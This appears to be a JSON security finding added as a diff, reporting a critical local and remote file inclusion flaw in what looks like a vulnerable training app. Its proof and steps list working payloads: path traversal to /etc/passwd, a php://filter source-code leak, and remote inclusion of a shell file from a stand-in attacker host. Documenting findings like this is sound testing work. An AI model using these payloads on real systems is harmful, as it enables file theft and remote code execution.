@@ -1,0 +1,11 @@
+{
+  "title": "Local/Remote File Inclusion (LFI/RFI)",
+  "severity": "Critical",
+  "location": "/vulnerabilities/fi/?page=",
+  "proof": "Multiple inclusion vectors confirmed: (1) Path traversal: ?page=../../../../../etc/passwd returned /etc/passwd contents. (2) PHP filter: ?page=php://filter/convert.base64-encode/resource=include.php returned base64-encoded source code. (3) Remote inclusion: ?page=http://127.0.0.1:8080/phpinfo.php executed and returned phpinfo. Full file disclosure and potentially RFI.",
+  "poc_steps": [
+    "GET /vulnerabilities/fi/?page=../../../../../etc/passwd",
+    "GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php",
+    "GET /vulnerabilities/fi/?page=http://attacker.com/shell.txt"
+  ]
+}
